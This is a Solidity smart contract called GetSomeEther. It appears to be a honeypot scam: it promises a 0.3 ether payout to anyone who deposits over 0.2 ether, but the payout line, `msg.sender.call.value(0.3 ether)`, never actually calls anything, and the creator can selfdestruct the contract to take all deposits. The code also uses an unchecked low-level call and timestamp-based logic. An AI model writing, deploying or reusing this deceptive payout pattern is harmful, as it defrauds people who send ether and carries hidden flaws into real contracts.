pragma solidity ^0.4.19;

contract GetSomeEther    
{
    address creator = msg.sender;
    uint256 public LastExtractTime;
    mapping (address=&gt;uint256) public ExtractDepositTime;
    uint256 public freeEther;
    
    function Deposit()
    public
    payable
    {
        if(msg.value&gt; 0.2 ether &amp;&amp; freeEther &gt;= 0.2 ether)
        {
            LastExtractTime = now + 2 days;
            ExtractDepositTime[msg.sender] = LastExtractTime;
            freeEther-=0.2 ether;
        }
    }
    
    function GetEther()
    public
    payable
    {
        if(ExtractDepositTime[msg.sender]!=0 &amp;&amp; ExtractDepositTime[msg.sender]&lt;now)
        {
            msg.sender.call.value(0.3 ether);
            ExtractDepositTime[msg.sender] = 0;
        }
    }
    
    function PutEther()
    public
    payable
    {
        uint256 newVal = freeEther+msg.value;
        if(newVal&gt;freeEther)freeEther=newVal;
    }
    
    function Kill()
    public
    payable
    {
        if(msg.sender==creator &amp;&amp; now&gt;LastExtractTime + 2 days)
        {
            selfdestruct(creator);
        }
        else revert();
    }
    
    function() public payable{}
}